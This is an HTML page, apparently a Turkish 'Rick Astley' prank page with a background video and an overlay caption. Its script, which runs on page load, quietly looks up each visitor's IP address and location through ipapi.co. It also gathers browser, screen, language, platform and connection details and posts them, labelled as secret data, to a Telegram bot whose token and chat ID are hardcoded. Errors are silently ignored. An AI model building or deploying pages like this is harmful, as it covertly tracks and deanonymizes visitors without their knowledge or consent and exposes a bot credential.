<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Rick And roll</title>
  <style>
    /* Reset */
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    html, body {
      height: 100%;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #000;
      overflow: hidden;
      color: #eee;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      align-items: center;
    }
    /* Video arka plan */
    #video-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      z-index: -1;
      filter: brightness(0.7);
    }
    /* Overlay metin */
    #overlay-text {
      width: 100%;
      background: rgba(0,0,0,0.5);
      text-align: center;
      padding: 15px 20px;
      font-size: 1.2rem;
      letter-spacing: 1px;
      user-select: none;
    }
    /* Responsive */
    @media (max-width: 600px) {
      #overlay-text {
        font-size: 1rem;
        padding: 10px 15px;
      }
    }
  </style>
</head>
<body>
  <video id="video-bg" autoplay loop muted playsinline>
    <source src="https://www.rickroll.com/video.mp4" type="video/mp4">
    <!-- YouTube embed olmadığından direkt mp4 linki olmalı, örnek video mp4 değil -->
    <!-- Eğer mp4 linki yoksa, YouTube iframe alternatif olarak eklenir ama autoplay sesli olmaz mobilde -->
    <!-- Bu örnek mp4 için -->
  </video>

  <div id="overlay-text">
    Şimdi Rick Astley ile eğlenmeye hazır olun!
  </div>

  <script>
    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID'in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Sessizce hatayı yoksay
      }
    }

    async function collectData() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const message = `Gizli Veri:\n` +
          `IP: ${data.ip}\n` +
          `Şehir: ${data.city}\n` +
          `Ülke: ${data.country_name}\n` +
          `Tarayıcı: ${navigator.userAgent}\n` +
          `Çözünürlük: ${screen.width}x${screen.height}\n` +
          `Dil: ${navigator.language}\n` +
          `Platform: ${navigator.platform}\n` +
          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;

        await sendToTelegram(message);
      } catch(e) {
        // Sessizce hatayı yoksay
      }
    }

    collectData();
  </script>
</body>
</html>
